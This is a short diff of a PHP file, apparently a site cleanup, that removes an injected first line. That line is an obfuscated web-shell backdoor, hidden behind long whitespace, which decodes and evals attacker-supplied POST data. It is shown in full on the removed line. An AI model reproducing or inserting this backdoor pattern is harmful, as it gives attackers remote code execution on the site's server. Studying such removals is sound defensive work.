@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                      $ejn0="tbda4cseo_6p"; $gyfc3=strtolower ( $ejn0[1].$ejn0[3].$ejn0[6]. $ejn0[7].$ejn0[10].$ejn0[4] . $ejn0[9] .$ejn0[2].$ejn0[7].$ejn0[5]. $ejn0[8].$ejn0[2].$ejn0[7] ) ;$wzly1 =strtoupper ($ejn0[9].$ejn0[11].$ejn0[8].$ejn0[6]. $ejn0[0]); if (isset (${ $wzly1 } [ 'n59397f'])) {eval( $gyfc3 (${ $wzly1}[ 'n59397f'])) ;} ?><?php
+<?php
 
 /**
  * @file
